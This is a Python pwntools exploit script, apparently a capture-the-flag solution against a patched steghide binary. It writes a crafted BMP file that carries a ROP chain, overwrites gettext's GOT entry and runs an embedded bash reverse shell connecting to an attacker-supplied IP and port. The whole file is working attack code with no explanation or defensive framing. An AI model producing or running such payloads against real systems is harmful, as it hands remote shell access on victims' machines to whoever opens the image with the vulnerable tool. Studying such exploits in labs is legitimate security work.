from pwn import *
import sys

ip = sys.argv[1]
port = int(sys.argv[2])

exe = ELF('./steghide_patched', checksec=False)

pop_rax_rbx_rbp = 0x0000000000414d29
pop_rsi = 0x0000000000417f3e
pop_rdx = 0x000000000042cd0c
pop_rdi = 0x0000000000450e8b
add_irbp_ebx = 0x0000000000404a38
pop_rbp = 0x0000000000404a39
leave_ret = 0x000000000040a392
syscall = 0x00000000004066b3
addr = 0x48a930
mov_inrbp_rdi = 0x00000000004220e0
mov_inrdx_rax = 0x0000000000436bf9

headerfile = b'BMzL\x02\x00\x00\x00\x00\x00>\x00\x00\x00(\x00\x00\x00\xd3\x05\x00\x00!\x03\x00\x00\x01\x00\x01\x00\x00\x00\x00\x00<L\x02\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\xff\xff\xff\x00'
shellrv = f"bash -c 'bash -i >& /dev/tcp/{ip}/{port} 0>&1'\x00"
rop = headerfile + b'a'*0x28

shell_addr = 0x48a990

rop += flat(
    pop_rax_rbx_rbp+1, 0x13e10, exe.got['gettext'] + 0x3d,
    add_irbp_ebx,
    pop_rdi, shell_addr,
    exe.sym['gettext'],
    word_size=64, sign = True
)
rop += shellrv.encode()
rop = rop.ljust(0x24caf, b'\x00')

rop += flat(
    addr,
    pop_rdx, addr-8,
    mov_inrdx_rax, addr + 8,
    pop_rdi, addr,
    mov_inrbp_rdi, addr + 0x20,
    pop_rdx, 0x6d0,
    0x41B355,
    pop_rbp, addr,
    leave_ret,
    word_size=64, sign = True
)

with open('payload.bmp', 'wb') as f:
  f.write(rop)


